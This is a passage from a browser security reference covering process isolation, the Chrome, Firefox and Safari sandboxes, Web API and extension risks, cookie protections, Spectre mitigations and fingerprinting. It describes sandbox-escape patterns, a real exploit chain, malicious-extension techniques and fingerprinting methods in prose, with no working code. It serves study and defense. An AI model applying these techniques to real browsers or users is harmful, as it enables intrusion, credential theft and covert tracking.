Chrome's site isolation policy assigns each site (scheme + eTLD+1) its own renderer process. Pages from `https://a.com` and `https://b.com` run in separate OS processes with separate address spaces. Even `https://a.com` in one tab and `https://a.com` in another tab may share a process (same site), but a cross-site iframe is always in a different process (out-of-process iframe, or OOPIF).

This enforces origin isolation at the OS level: a renderer-process exploit in `a.com`'s process cannot read `b.com`'s memory (it's in a different process). Without site isolation, all sites shared a single renderer process, and a renderer exploit could read any site's in-memory data (passwords, cookies, DOM state).

### 5.2 CORB and ORB

**CORB (Cross-Origin Read Blocking).** The browser blocks certain cross-origin responses from reaching the renderer process at all. If a cross-origin response has a MIME type that indicates it is HTML, XML, or JSON (and is not loaded as a valid subresource — e.g., it's loaded via `<script>` or `<img>` but its content is not a valid script or image), CORB replaces the response body with an empty body before it reaches the renderer. This prevents Spectre-style attacks from reading cross-origin data from the renderer's memory (the data never enters the renderer's address space).

CORB inspects `Content-Type` headers and performs content sniffing (looking at the first few bytes for HTML/JSON/XML signatures). Miscategorized `Content-Type` (e.g., serving JSON as `text/html`) can cause CORB to block legitimate subresource loads — server operators must use correct MIME types.

**ORB (Opaque Response Blocking).** The successor to CORB, with broader blocking rules. ORB blocks any cross-origin response that is opaque (not CORS-authorized) from being delivered to the renderer in a readable form, regardless of MIME type. This closes gaps in CORB's MIME-type-based heuristic. ORB is the fetch spec's standardized version of CORB.

---

## 6. Blink rendering engine

Blink (Chrome's rendering engine, forked from WebKit) processes the document lifecycle:

**Parsing.** The HTML parser (`HTMLDocumentParser`) tokenizes HTML into a stream of tokens and builds the DOM tree. JavaScript execution during parsing (inline `<script>` or `document.write`) can modify the token stream. The speculative parser (`HTMLPreloadScanner`) scans ahead to identify and prefetch resources referenced by not-yet-parsed markup.

**DOM tree.** The in-memory representation of the document's structure: nodes (`Element`, `Text`, `Comment`, etc.) forming a tree. The DOM is the interface between JavaScript (V8) and the rendering engine. Each DOM node has a C++ backing object in Blink and a V8 wrapper object; the two are linked by persistent handles managed by `V8DOMWrapper`.

**CSSOM.** The CSS Object Model — the parsed representation of all stylesheets. Combined with the DOM, it produces the **render tree** (only visible elements with computed styles).

**Layout.** Computes the position and size of every element in the render tree. Layout is triggered by JavaScript reading layout-dependent properties (`offsetWidth`, `getBoundingClientRect`), by style changes, and by window resize. **Forced layout** (synchronous layout triggered by JS reading layout properties after modifying the DOM) is both a performance problem and a security-relevant operation: it forces Blink to walk the tree and compute geometry, which can trigger bugs in layout code.

**Paint.** Converts the layout tree into display items (drawing commands: "draw rectangle at (x,y) with color #fff", "draw text 'Hello' at (x,y)"). Display items are recorded into `PaintRecord` objects.

**Compositing.** Display items are organized into compositing layers, which are rasterized by the GPU process. Compositing enables smooth scrolling and CSS animations without re-layout or re-paint. Layer promotion decisions (`will-change: transform`, `position: fixed`, `<video>`) affect GPU memory usage.

**Security relevance:** Blink is a massive C++ codebase (approximately 10 million lines including generated code). UAF bugs in DOM manipulation (creating and destroying nodes while JavaScript retains references), type confusion in the rendering pipeline (treating a `Text` node as an `Element`), and integer overflows in layout calculations are recurring vulnerability classes. The Chrome Vulnerability Reward Program consistently receives Blink bugs. Fuzzing tools like Domato (by Google Project Zero) specifically target DOM/layout/rendering code.

---

## 7. Chrome sandbox architecture

### 7.1 The renderer sandbox

The renderer process is the most-attacked process (it processes untrusted web content). Chrome confines it with the most restrictive sandbox:

**Windows.** The renderer runs with a restricted token (low integrity level, all privileges removed, restricted SID), in a job object (no process creation, limited resource access), and with a sandboxed desktop. Win32k lockdown (preventing the renderer from calling GDI/USER syscalls) eliminates a large kernel attack surface. Code Integrity Guard (`PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON`) prevents injection of third-party DLLs. CET (Control-flow Enforcement Technology) shadow stack is enabled where hardware supports it.

**macOS.** The renderer runs under a Sandbox profile (a declarative policy that restricts file access, network access, Mach port access, and system calls). The profile is tightly scoped: no file read/write except specific temp directories, no network access (all networking goes through the browser process via Mojo IPC). PAC (Pointer Authentication Codes) on Apple Silicon adds hardware-level control flow integrity.

**Linux.** The renderer runs in a user namespace + PID namespace + network namespace (no network), with a seccomp-BPF filter that allows only a minimal set of syscalls (about 30–40). `prctl(PR_SET_NO_NEW_PRIVS)` is set. The Zygote process (which `fork`s to create renderers) configures the sandbox before the renderer begins processing content. On Chrome OS, the renderer additionally runs in a cgroup with memory limits.

### 7.2 Other sandboxed processes

**GPU process.** Less restricted than the renderer (it needs access to GPU devices and drivers) but still sandboxed. On Linux: seccomp with a larger syscall allowlist including `ioctl` (for GPU driver communication). The GPU process communicates with renderers via Mojo IPC and is a potential escalation target (GPU driver vulnerabilities give kernel access).

**Network service.** Handles all network I/O. Sandboxed similarly to the renderer (no filesystem access, restricted syscalls). Network data is passed to renderers via Mojo after CORB/ORB filtering. TLS certificate verification happens here.

**Browser (main) process.** The most-privileged process: manages tabs, downloads, bookmarks, and inter-process coordination. It is NOT sandboxed (it needs full system access). Compromising the browser process from a sandboxed renderer requires a sandbox escape.

### 7.3 Mojo IPC

Mojo is Chrome's inter-process communication framework. Renderer processes communicate with the browser process and other services exclusively through Mojo interfaces (defined in `.mojom` IDL files). Each Mojo interface defines methods with typed parameters; the browser-side implementation validates all parameters before acting.

**Sandbox escapes through Mojo:** If a Mojo interface implementation in the browser process has a vulnerability (e.g., a buffer overflow in parameter handling, a logic bug that grants unintended access, a TOCTOU in permission checking), a compromised renderer can exploit it to execute code in the browser process — escaping the sandbox.

**Mojo exploit patterns:**
1. **Interface enumeration.** A compromised renderer enumerates all bindable Mojo interfaces via `BrowserInterfaceBroker`. Some interfaces are only intended for privileged contexts (WebUI) but are accidentally exposed to web content.
2. **Parameter confusion.** A Mojo method accepts a `mojo::PendingRemote<Foo>` parameter. The compromised renderer sends a `PendingRemote` that actually points to a different interface type, causing type confusion in the browser process.
3. **Race conditions.** A Mojo method checks a permission, then performs an action. The compromised renderer races the check by changing state between the check and the action.

### 7.4 Sandbox escape vectors

A full Chrome exploit chain typically requires: (1) a renderer bug (V8 type confusion, Blink UAF) to achieve code execution in the renderer process, (2) a sandbox escape (Mojo interface bug, GPU process bug, kernel bug) to break out of the renderer sandbox, and (3) optionally, a kernel exploit for system-level persistence.

**Common escape vectors:**

- **Mojo interface bugs.** The renderer sends crafted IPC messages that trigger vulnerabilities in the browser process. Example: CVE-2020-6418 was chained with a Mojo bug for full sandbox escape.
- **GPU process bugs.** The renderer sends malformed GPU commands that trigger driver vulnerabilities. The GPU process is a "half-step" — escaping the renderer into the GPU process, then exploiting a GPU driver bug for kernel access.
- **Kernel bugs.** The renderer's seccomp filter still allows some syscalls (e.g., `futex`, `clock_gettime`); a kernel vulnerability in an allowed syscall gives kernel code execution. Linux kernel bugs in `futex` (CVE-2014-3153, Towelroot) and `io_uring` have been used, though `io_uring` is blocked by Chrome's seccomp filter.
- **Win32k bypass.** Before Win32k lockdown was complete, renderers could call `win32k.sys` syscalls. CVE-2019-0808 (Win32k null pointer dereference exploited for LPE) was chained with CVE-2019-5786 (FileReader UAF) for a full in-the-wild exploit chain.

**Full chain example: CVE-2019-5786 + CVE-2019-0808.**
1. `CVE-2019-5786`: UAF in Chrome's `FileReader` API. The asynchronous `FileReader.readAsArrayBuffer()` freed its internal buffer while a reference was still accessible via a `SharedArrayBuffer` view. Exploitation: trigger the UAF, spray the heap to replace the freed buffer with a fake object, achieve arbitrary read/write in the renderer.
2. `CVE-2019-0808`: NULL pointer dereference in `win32k!MNGetpItemFromIndex`. The renderer (before full Win32k lockdown) called into `win32k.sys`, triggering the LPE. The combined chain: renderer RCE → Win32k LPE → SYSTEM-level code execution. Patched in Chrome 72.0.3626.121 and Windows March 2019 Patch Tuesday. Exploited in the wild by an APT targeting Middle East organizations.

---

## 8. Firefox sandbox (RLBox)

Firefox uses a multi-process architecture similar to Chrome (content processes, GPU process, main process) with sandboxing per process.

**RLBox** is a novel sandboxing approach for third-party libraries within a process. Rather than running a library (e.g., libGraphite for font shaping, libogg for audio) in the same address space with full access, RLBox compiles the library to WebAssembly (Wasm) or runs it in a separate process, and provides a safe C++ API that automatically validates all data crossing the sandbox boundary (checking pointer validity, enforcing type invariants, and taint-tracking).

RLBox defends against vulnerabilities in third-party libraries: even if libGraphite has a buffer overflow, the overflow is confined to the Wasm sandbox's linear memory and cannot affect the rest of the process. Firefox has deployed RLBox for libGraphite, libExpat (XML parsing), libOgg, Hunspell (spell checking), and woff2 (web font decompression).

**sandboxbroker.** Firefox's IPC broker, analogous to Chrome's Mojo browser-process endpoint. The content process communicates with the broker for privileged operations (file access, network, clipboard). The broker validates all requests and enforces policy. Firefox's content process sandbox on Linux uses seccomp-BPF with a restrictive filter and PID/user namespaces, similar to Chrome.

**Firefox Fission.** Firefox's site-isolation project (analogous to Chrome's site isolation). Fission places cross-origin iframes in separate processes. Enabled by default since Firefox 95. Fission's IPC uses IPDL actors, with parent-side validation of all messages from content processes.

---

## 9. Safari/WebKit sandbox and XPC

Safari on macOS/iOS uses a multi-process model: the WebContent process (analogous to Chrome's renderer) is sandboxed with a strict Sandbox profile. The Networking process handles HTTP. The UI process manages tabs and user interaction.

**XPC (Cross-Process Communication)** is Apple's IPC framework. Safari's processes communicate via XPC services with defined interfaces. Each XPC service has its own sandbox profile and entitlements. A WebContent process compromise requires an XPC interface vulnerability (or a kernel bug) to escape the sandbox.

**iOS specifics.** On iOS, the WebContent process runs in an extremely restrictive sandbox: no JIT for third-party browsers (only Safari's WebContent process has the `dynamic-codesigning` entitlement that permits JIT — other browsers must use the system WebView and cannot JIT), limited system call access, and no direct file system access. This makes iOS browser exploitation significantly harder than macOS or other platforms. JIT-less execution means the attacker cannot write shellcode to a JIT code page; exploitation requires pure ROP/JOP chains.

**JavaScriptCore (JSC) exploitation.** JSC is WebKit's JS engine. Its JIT pipeline (LLInt → Baseline JIT → DFG JIT → FTL JIT) has similar vulnerability classes to V8: DFG/FTL type confusion, bounds check elimination bugs, JIT spraying (placing controlled constants in JIT code to create gadgets). Notable CVE: CVE-2021-1844 (JSC type confusion exploited via a malicious web page, patched in Safari 14.0.3).

---

## 10. Web API security

### 10.1 Service Workers

**Mechanism.** A Service Worker is a JavaScript worker registered for a scope (e.g., `/`) that intercepts all network requests within that scope. It runs in its own thread, has no DOM access, and communicates with pages via `postMessage` and the Fetch/Cache APIs.

**Security risks:**
- **Persistent interception.** A Service Worker persists across page loads and browser restarts (until explicitly unregistered). An attacker who achieves XSS and registers a malicious Service Worker gains persistent man-in-the-middle on all requests within the scope — even after the XSS vulnerability is patched.
- **Cache poisoning.** A malicious Service Worker can serve modified responses from Cache Storage, injecting scripts into cached pages.
- **Scope confusion.** The Service Worker scope is path-based (`/app/`). A Service Worker registered at `/` intercepts requests for all subpaths. If a site has user-uploaded content at `/uploads/` on the same origin, an attacker who can upload an HTML file may register a Service Worker scoped to `/`.

**Hardening:**
- `Service-Worker-Allowed` header restricts maximum scope.
- `Clear-Site-Data: "storage"` header unregisters all Service Workers for the origin.
- CSP `worker-src` directive controls which scripts can be registered as workers.
- Service Workers require HTTPS (except `localhost`).

### 10.2 Web Workers and SharedArrayBuffer

**SharedArrayBuffer (SAB).** Provides shared memory between a page and its workers. Post-Spectre, SAB can be used as a high-resolution timing oracle: a worker increments a counter in shared memory in a tight loop; the main thread reads the counter to measure elapsed time with sub-microsecond precision, enabling Spectre attacks (cache-timing side channels).

**Mitigations:** Browsers gate SAB access behind cross-origin isolation. A page must serve `Cross-Origin-Opener-Policy: same-origin` (COOP) and `Cross-Origin-Embedder-Policy: require-corp` (COEP) headers. With these headers, the page is guaranteed to be in its own process (no cross-origin windows share the process), and SAB is re-enabled. Without COOP+COEP, `SharedArrayBuffer` constructor throws.

### 10.3 WebRTC

**IP leak.** WebRTC's ICE (Interactive Connectivity Establishment) candidate gathering reveals the user's local and public IP addresses, even behind a VPN or NAT. STUN requests to a STUN server reveal the public IP; local candidates reveal RFC 1918 addresses. Mitigation: `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns` replaces local IPs with mDNS hostnames. Firefox: `media.peerconnection.ice.no_host` in `about:config`.

**ICE candidate harvesting.** A malicious page creates an `RTCPeerConnection`, adds a data channel, creates an offer, and sets the local description — triggering ICE candidate gathering without ever connecting to a peer. The `onicecandidate` callback receives candidates containing IP addresses.

**SRTP downgrade.** WebRTC mandates DTLS-SRTP for media encryption. An MitM attacker on the signaling channel (if signaling is not end-to-end authenticated) could potentially inject SDP to downgrade cipher suites. Mitigation: SRTP uses strong cipher suites by default; Certificate fingerprints in SDP (`a=fingerprint`) authenticate the DTLS handshake.

**TURN credential exposure.** TURN server credentials are passed to `RTCPeerConnection` configuration in JavaScript. If the page is vulnerable to XSS, the attacker can extract TURN credentials. TURN credentials should be short-lived and per-session.

### 10.4 WebGL

**GPU information leak.** `WEBGL_debug_renderer_info` extension exposes GPU vendor and renderer strings, enabling fingerprinting. Chrome has removed this extension for non-privileged contexts.

**Shader-based attacks.** WebGL shaders (GLSL) execute on the GPU. Malicious shaders can cause GPU hangs (denial of service via infinite loops — mitigated by shader complexity limits and GPU watchdog timers), and historically, bugs in GPU driver shader compilers have led to code execution in the GPU process. ANGLE (Almost Native Graphics Layer Engine) translates WebGL calls to the platform's native API (Direct3D on Windows, OpenGL/Vulkan on Linux/macOS), adding a validation layer.

**Cross-origin texture reads.** The WebGL specification prevents `texImage2D` from reading cross-origin images without CORS authorization. The image data is "tainted" — reading it back via `readPixels` or `toDataURL` on a tainted canvas throws a `SecurityError`.

### 10.5 Other Web APIs

**Payment Request API.** Collects payment information. The API only activates on HTTPS origins, requires user gesture to show the payment sheet, and payment details are not exposed to the page until the user confirms. However, a compromised renderer could bypass the user-gesture requirement.

**Credential Management API / WebAuthn.** WebAuthn creates origin-bound credentials: a credential registered for `https://example.com` cannot be used on `https://evil.com`. The authenticator (hardware key, platform biometrics) verifies the origin via the relying-party ID. An attacker compromising the renderer cannot forge the RP ID because the browser process (not the renderer) sends the RP ID to the authenticator. Phishing is mitigated because the credential is bound to the legitimate origin.

**WebAuthn implementation risks:**
- **RP ID validation.** The relying-party ID must be a registrable domain suffix of the page's origin. `https://login.example.com` can use RP ID `example.com` but not `com`. Implementation bugs in RP ID validation could allow credential confusion across origins.
- **Attestation bypass.** If the server does not validate the authenticator's attestation statement, a software-based authenticator (e.g., virtual authenticator in DevTools) can create credentials, bypassing hardware security guarantees.
- **Passkey sync.** Platform authenticators (Apple Keychain, Google Password Manager) sync passkeys across devices. A compromise of the cloud sync account exposes all synced passkeys. This is a UX/security tradeoff, not a protocol flaw.

### 10.6 Permissions Policy (formerly Feature Policy)

**Mechanism.** The `Permissions-Policy` HTTP header controls which Web APIs are available in a document and its iframes. Granular control over features like camera, microphone, geolocation, fullscreen, payment, and more.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self), fullscreen=(self "https://trusted.com")
```

**Security impact:** Prevents malicious iframes from accessing sensitive APIs even if the user has granted permission to the top-level page. Without `Permissions-Policy`, an embedded cross-origin iframe inherits the parent's permission grants by default for some APIs.

**`allow` attribute on iframes.** The `allow` attribute on `<iframe>` tags delegates permissions: `<iframe allow="camera; microphone" src="https://meet.example.com">`. Without the `allow` attribute, cross-origin iframes cannot access these APIs regardless of the `Permissions-Policy` header.

### 10.7 Fetch Metadata headers

Browsers send `Sec-Fetch-*` headers on all requests, enabling the server to understand the request context and reject suspicious requests:

- `Sec-Fetch-Site`: `same-origin`, `same-site`, `cross-site`, `none` (user-initiated, e.g., typing URL)
- `Sec-Fetch-Mode`: `navigate`, `cors`, `no-cors`, `same-origin`, `websocket`
- `Sec-Fetch-Dest`: `document`, `script`, `image`, `style`, `font`, etc.
- `Sec-Fetch-User`: `?1` if user-activated (click, keyboard)

**Resource Isolation Policy pattern.** A server middleware that rejects cross-site requests to non-navigation endpoints:
```
if Sec-Fetch-Site == "cross-site" AND Sec-Fetch-Mode != "navigate":
    return 403 Forbidden
```
This blocks CSRF, XSSI, and cross-origin data exfiltration at the server level, complementing browser-side mitigations like SameSite cookies.

---

## 11. Extension security

### 11.1 Manifest V3 security model

Manifest V3 (MV3) replaced Manifest V2's persistent background pages with ephemeral service workers, removed remote code execution (`eval`, `chrome.scripting.executeScript` with string code), and replaced `webRequest.onBeforeRequest` blocking with `declarativeNetRequest` (rules-based, no access to request/response bodies). These changes reduce the attack surface of extensions:

- **No remote code.** MV3 extensions cannot fetch and execute remote scripts. All code must be bundled in the extension package. This prevents extension supply-chain attacks where a compromised CDN serves malicious code.
- **Narrower host permissions.** MV3 encourages `activeTab` (permission granted only when the user explicitly invokes the extension on a tab) over broad `<all_urls>` host permissions.
- **Content script isolation.** Content scripts run in an "isolated world" — a separate JavaScript context from the page's scripts. They share the DOM but not JavaScript objects. A page cannot access a content script's variables, and vice versa (unless explicitly using `window.postMessage` or DOM events).

### 11.2 Extension permission model

Extensions declare permissions in `manifest.json`. Chrome prompts the user at install time for permissions classified as "warnings" (e.g., "Read and change all your data on all websites" for `<all_urls>`). Runtime permissions (`chrome.permissions.request`) can be requested later with a user prompt.

**Over-permissioned extensions.** Extensions requesting `<all_urls>` + `cookies` + `webRequest` have full MitM capability on all browsing. Enterprise policies can restrict which extensions are allowed (`ExtensionInstallAllowlist`, `ExtensionInstallBlocklist`).

### 11.3 Malicious extension techniques

- **Keylogging.** A content script injected on all pages can listen for `keydown`/`keyup` events and exfiltrate keystrokes.
- **Cookie theft.** An extension with `cookies` permission can read all cookies for all domains, including `HttpOnly` cookies (the `HttpOnly` flag only prevents JavaScript on the page from accessing the cookie; extensions bypass this).
- **Traffic interception (MV2).** `webRequest` blocking API allows modifying/redirecting/blocking requests. MV3's `declarativeNetRequest` limits this to static rules.
- **Session hijacking.** Combining cookie theft with `webRequest` interception allows full session hijacking for any site.

### 11.4 Chrome Web Store supply chain attacks

**Technique:** An attacker acquires a legitimate, popular extension (by purchase, social engineering, or compromising the developer's account), then pushes a malicious update. The update passes review (automated + limited manual) and auto-updates to all users.

**Historical cases:**
- **The Great Suspender (2021).** A popular tab-management extension was sold to an unknown entity that added tracking code.
- **Multiple extensions (2023–2024).** Coordinated campaigns compromised developer accounts via phishing OAuth consent pages, then injected ad-injection and data-exfiltration code.

**Detection:** Monitor `chrome://extensions` for unexpected permission changes. Enterprise: use `ExtensionSettings` policy to pin extension versions and block auto-updates.

### 11.5 Content script isolation deep dive

Content scripts run in an "isolated world" — a V8 context with its own global object, separate from the page's V8 context. Both worlds share the same DOM: mutations by either side are visible to the other. However, JavaScript prototypes, global variables, and closures are not shared.

**Bypassing isolation via DOM.** Since the DOM is shared, a malicious page can communicate with a content script by:
- Setting DOM attributes or `data-*` attributes that the content script reads.
- Dispatching custom DOM events (`new CustomEvent('attack', {detail: payload})`).
- Mutating the DOM in ways that trigger MutationObserver callbacks in the content script.
- Injecting a `<script>` tag that modifies DOM elements the content script depends on.

If the content script trusts DOM content without validation, the page can influence its behavior (e.g., injecting data that the content script sends to the extension's background service worker via `chrome.runtime.sendMessage`).

**Message passing vulnerabilities.** Extensions often use `chrome.runtime.onMessageExternal` to receive messages from web pages. If the extension does not validate `sender.origin` or `sender.url`, any page can send messages to the extension's background script. If the background script performs privileged actions (navigating tabs, reading cookies, modifying headers) based on unvalidated messages, it is effectively an open API for web pages.

### 11.6 Enterprise extension management

Enterprise environments use Chrome policies to control extensions:
- `ExtensionInstallAllowlist` / `ExtensionInstallBlocklist`: Control which extensions can be installed.
- `ExtensionInstallForcelist`: Force-install extensions (cannot be removed by users).
- `ExtensionSettings`: Per-extension granular control (pin versions, restrict permissions, block installation).
- `ExtensionAllowedTypes`: Restrict to specific extension types (e.g., only themes).
- `BlockExternalExtensions`: Prevent sideloading.

Chrome's `chrome://policy/` page shows active policies. `chrome://extensions/` shows extension details including permissions, content scripts, and associated web-accessible resources.

---

## 12. Cookie security

### 12.1 SameSite enforcement

**`SameSite=Lax` (default since Chrome 80, February 2020).** Cookies without an explicit `SameSite` attribute are treated as `Lax`: sent on top-level navigations (user clicking a link) but NOT on cross-site subrequest (images, scripts, iframes, fetch). This mitigates CSRF for the common case (POST-based CSRF from a cross-site form submission no longer sends session cookies).

**`SameSite=Strict`.** Cookie is never sent on cross-site requests, including top-level navigations. Strongest CSRF protection but breaks some legitimate flows (e.g., clicking a link from email to a logged-in site sends no cookies; the user appears logged out on arrival).

**`SameSite=None; Secure`.** Cookie is sent on all cross-site requests but MUST have the `Secure` flag (HTTPS only). Required for legitimate cross-site use cases (SSO, embeds, payment iframes).

### 12.2 Cookie prefixes

**`__Host-` prefix.** The cookie must be: set with `Secure`, set from an HTTPS origin, have `Path=/`, and have no `Domain` attribute. This locks the cookie to the exact origin (no subdomain sharing). Prevents a subdomain takeover from overwriting the session cookie.

**`__Secure-` prefix.** The cookie must be set with `Secure`. Less restrictive than `__Host-`, but prevents an HTTP MitM from setting the cookie.

### 12.3 Partitioned cookies (CHIPS)

**Cookies Having Independent Partitioned State (CHIPS).** A third-party cookie set with `Partitioned` attribute is keyed by the top-level site (the site in the address bar), not just the cookie's domain. A cookie for `tracker.com` set on `siteA.com` is invisible when `tracker.com` is embedded on `siteB.com`. This preserves legitimate third-party cookie use cases (e.g., embedded widgets) while preventing cross-site tracking.

Header: `Set-Cookie: __Host-widget=abc; Secure; Path=/; SameSite=None; Partitioned`

### 12.4 Third-party cookie deprecation

Chrome's Privacy Sandbox initiative phases out third-party cookies. As of 2025, Chrome limits third-party cookies with user controls and plans to deprecate them fully. Replacements: Topics API (interest-based advertising), Attribution Reporting API (conversion measurement), Protected Audience API (remarketing auctions), and Partitioned cookies (CHIPS) for legitimate use cases.

### 12.5 Cookie theft techniques and modern mitigations

- **XSS-based theft.** `document.cookie` exfiltration. Mitigated by `HttpOnly` flag (prevents JS access).
- **Network MitM.** Unencrypted HTTP sends cookies in cleartext. Mitigated by `Secure` flag and HSTS.
- **Subdomain takeover.** If `sub.example.com` is a dangling CNAME, an attacker claiming it can set cookies for `.example.com`. Mitigated by `__Host-` prefix.
- **Malware/stealer.** Browser credential stealers (Raccoon, RedLine, Lumma) extract cookies from the browser's cookie database on disk. Chrome App-Bound Encryption (Windows, Chrome 127+) encrypts cookies with a key bound to the Chrome application identity, preventing extraction by non-Chrome processes. On macOS, cookies are protected by the Keychain.

---

## 13. Speculative execution defenses in browsers

### 13.1 Spectre and the browser threat model

Spectre (CVE-2017-5753 Variant 1, CVE-2017-5715 Variant 2) demonstrated that speculative execution can leak data across security boundaries within a process. In a browser, JavaScript running in origin A's context could speculatively access memory belonging to origin B (if both share a process), then encode the leaked data into a cache-timing side channel. SharedArrayBuffer provided the timing oracle; `performance.now()` with sufficient resolution was another.

### 13.2 Mitigations

**`performance.now()` resolution reduction.** Browsers reduced the resolution from 5 microseconds to 100 microseconds (Chrome) or 1 millisecond (Firefox), and added jitter. This degrades (but does not eliminate) timing-based side channels.

**SharedArrayBuffer gating (COOP + COEP).** As described in §10.2, SAB requires cross-origin isolation. The COOP header (`Cross-Origin-Opener-Policy: same-origin`) ensures the page's browsing context group contains only same-origin windows. COEP (`Cross-Origin-Embedder-Policy: require-corp`) ensures all subresources are either same-origin or explicitly opted-in via CORS or `Cross-Origin-Resource-Policy`. Together, they guarantee process isolation for the page, making SAB safe to enable.

**CORB / ORB (§5.2).** Prevents cross-origin response bodies from entering the renderer's memory at all.

**Site isolation (§5.1).** Ensures different sites are in different processes, limiting Spectre's cross-site reach.

**`Cross-Origin-Resource-Policy` (CORP).** A response header that declares which contexts can load the resource: `same-origin`, `same-site`, or `cross-origin`. Resources without CORP in a COEP-enforced context are blocked.

**`Origin-Agent-Cluster`.** Response header that requests per-origin process isolation (when supported by the browser). `Origin-Agent-Cluster: ?1`.

### 13.3 Deployment checklist

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin  (on API responses)
```

All subresources must be either same-origin or served with `Cross-Origin-Resource-Policy: cross-origin` (or CORS-enabled). Third-party resources that do not support CORP/CORS will break under COEP — use `crossorigin="anonymous"` on `<script>`, `<link>`, `<img>` tags and ensure the server sends appropriate CORS headers.

**Verifying cross-origin isolation status.** In JavaScript: `self.crossOriginIsolated` returns `true` when COOP+COEP are active and the page is in its own agent cluster. In DevTools: Application panel → "Cross-origin isolation" section shows COOP/COEP status and any issues.

### 13.4 Spectre variant details in browser context

**Spectre v1 (bounds check bypass).** An attacker trains the branch predictor to speculatively execute past an array bounds check, reading out-of-bounds memory. In the browser, JavaScript `if (idx < array.length) { ... array[idx] ... }` can be speculatively executed with an out-of-bounds `idx` if the branch predictor is trained with in-bounds values first. The speculatively loaded data is encoded into the cache state (e.g., using it as an index into a probe array) and later recovered by measuring cache-hit timing.

**Spectre v2 (branch target injection).** The attacker poisons the Branch Target Buffer (BTB) to redirect indirect branches to attacker-controlled gadgets during speculative execution. In V8, indirect calls through vtables or function pointer tables could be targeted. Browser mitigations: Retpoline (replaces indirect branches with a return-based construct that cannot be speculatively redirected), IBRS/STIBP CPU microcode updates.

**Spectre-BHB (Branch History Buffer injection).** Extends Spectre v2 by manipulating the Branch History Buffer. Relevant for environments with hardware mitigations (eIBRS) that Spectre-BHB can bypass. Browsers rely on process isolation to contain this.

**Microarchitectural Data Sampling (MDS) / Zombieload / RIDL / Fallout.** These attacks leak data from CPU microarchitectural buffers (line-fill buffers, load ports, store buffers). Browsers mitigate by flushing buffers on context switches (OS responsibility) and by site isolation (ensuring cross-site data is never in the same process's microarchitectural state).

---

## 14. Privacy and fingerprinting

### 14.1 Canvas fingerprinting

**Mechanism.** Draw text and shapes on an `HTMLCanvasElement`, then call `canvas.toDataURL()` or `getImageData()`. Subtle rendering differences (font rasterization, anti-aliasing, GPU-specific rendering paths, subpixel rendering) produce a unique image hash per browser/OS/GPU combination. Even identical hardware produces slightly different output across OS versions.

**Detection.** The `CanvasBlocker` extension detects and blocks `toDataURL` / `getImageData` calls on canvases with rendered content.

**Browser mitigations:** Brave randomizes canvas readback data (adding imperceptible noise). Firefox in Enhanced Tracking Protection strict mode prompts before canvas fingerprinting. Tor Browser uses a uniform rendering configuration and blocks canvas readback by default.

### 14.2 WebGL fingerprinting

**`WEBGL_debug_renderer_info`.** Exposes `GL_RENDERER` and `GL_VENDOR` strings (e.g., "ANGLE (NVIDIA GeForce RTX 3080, ...)"). Combined with supported extensions (`gl.getSupportedExtensions()`), shader precision formats, and maximum texture sizes, this creates a detailed GPU fingerprint.

**Mitigations:** Chrome has deprecated `WEBGL_debug_renderer_info` for non-privileged contexts (removed in Chrome 113+). Brave and Firefox expose generic strings. Tor Browser disables WebGL by default.

### 14.3 AudioContext fingerprinting

**Mechanism.** Create an `OfflineAudioContext`, generate a signal with an `OscillatorNode`, process it through a `DynamicsCompressorNode`, and read back the rendered audio buffer. Hardware and software audio processing differences (sample rate conversion, floating-point implementation) produce unique output.

**Mitigations:** Brave adds noise to `AudioBuffer` readback. Firefox (under Resist Fingerprinting mode) normalizes audio output. Tor Browser disables the Web Audio API.

### 14.4 Font enumeration fingerprinting

**Mechanism.** Measure the rendered width of text in various fonts by setting `font-family` CSS and comparing against a baseline (e.g., monospace). If the width changes, the font is installed. The set of installed fonts is highly unique (especially with uncommon fonts from design software, language packs, or enterprise deployments).

**Mitigations:** Chrome 103+ restricts `document.fonts` enumeration to web-safe and system-default fonts (blocking visibility of user-installed fonts). `Local Font Access API` requires user permission. Firefox Resist Fingerprinting mode limits visible fonts. Tor Browser restricts fonts to a bundled set.

### 14.5 Other fingerprinting vectors

- **Navigator/UA string.** `navigator.userAgent`, `navigator.platform`, `navigator.language`, `navigator.hardwareConcurrency`, `navigator.deviceMemory`. User-Agent Client Hints (`Sec-CH-UA-*`) reduce passive fingerprint surface by sending a reduced UA string by default, with detailed info only via opt-in.
- **Screen resolution.** `screen.width`, `screen.height`, `screen.colorDepth`, `window.devicePixelRatio`.
- **Timezone.** `Intl.DateTimeFormat().resolvedOptions().timeZone`.
- **Battery API.** Removed from non-secure contexts and deprecated in some browsers due to fingerprinting concerns.
- **Media devices.** `navigator.mediaDevices.enumerateDevices()` reveals the number and types (but not labels without permission) of cameras and microphones.
- **TCP/IP stack fingerprinting.** The browser's HTTP/2 settings frame (SETTINGS_INITIAL_WINDOW_SIZE, SETTINGS_MAX_CONCURRENT_STREAMS), TLS ClientHello (cipher suite order, extensions, supported groups), and TCP window size and options can be fingerprinted at the network level. JA3/JA4 TLS fingerprinting identifies browsers and versions based on the ClientHello structure.

### 14.6 Anti-fingerprinting measures

**Brave.** Randomizes canvas, WebGL, and AudioContext readback. Blocks known fingerprinting scripts. Adds noise to screen dimensions and language lists. Provides per-session randomized fingerprint components.

**Firefox Resist Fingerprinting (`privacy.resistFingerprinting`).** Spoofs screen size to the content window size, spoofs timezone to UTC, restricts fonts, reduces `performance.now()` resolution, restricts canvas/WebGL readback, and more. Available via `about:config`.

**Tor Browser.** The most comprehensive anti-fingerprinting implementation. Goal: all Tor Browser users look identical. Uniform window size (rounded to multiples of 200x100), uniform user agent, disabled WebGL, restricted canvas, blocked plugins, uniform font set, UTC timezone, and letter-boxing (padding content area to standard sizes to prevent window-size fingerprinting).

**Privacy Budget (proposal).** A Chrome proposal (paused/evolving) to track how much fingerprinting entropy a page has accessed. Once the budget is exceeded, APIs that contribute to fingerprinting return reduced-precision or generic values.

### 14.7 Fingerprinting entropy estimation

Each fingerprinting vector contributes a certain number of bits of entropy (ability to distinguish users):

| Vector | Approximate entropy |
|--------|-------------------|
| User-Agent string | 8–12 bits |
| Screen resolution + DPR | 4–6 bits |
| Timezone | 3–5 bits |
| Installed fonts | 10–15 bits |
| Canvas hash | 8–12 bits |
| WebGL renderer + params | 8–10 bits |
